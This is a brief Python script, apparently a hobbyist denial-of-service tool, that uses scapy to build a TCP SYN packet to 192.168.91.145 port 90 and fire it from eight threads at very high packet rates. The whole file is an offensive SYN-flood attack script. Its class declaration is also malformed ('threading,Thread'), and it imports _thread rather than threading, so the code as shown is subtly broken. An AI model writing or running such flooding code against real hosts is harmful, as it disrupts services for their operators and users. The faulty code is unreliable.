from scapy.all import *
import _thread
import time

from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether

p=Ether()/IP(dst="192.168.91.145")/TCP(dport=90,flags='S')

class myThread (threading,Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print("Starting" + self.name)
        sendpfast(p,pps=10000000,loop=40000000)

thread1 = myThread(1,"Thread-1",1)
thread2 = myThread(2,"Thread-2",2)
thread3 = myThread(3,"Thread-3",3)
thread4 = myThread(4,"Thread-4",4)
thread5 = myThread(5,"Thread-5",5)
thread6 = myThread(6,"Thread-6",6)
thread7 = myThread(7,"Thread-7",7)
thread8 = myThread(8,"Thread-8",8)

thread1.start();
thread2.start();
thread3.start();
thread4.start();
thread5.start();
thread6.start();
thread7.start();
thread8.start();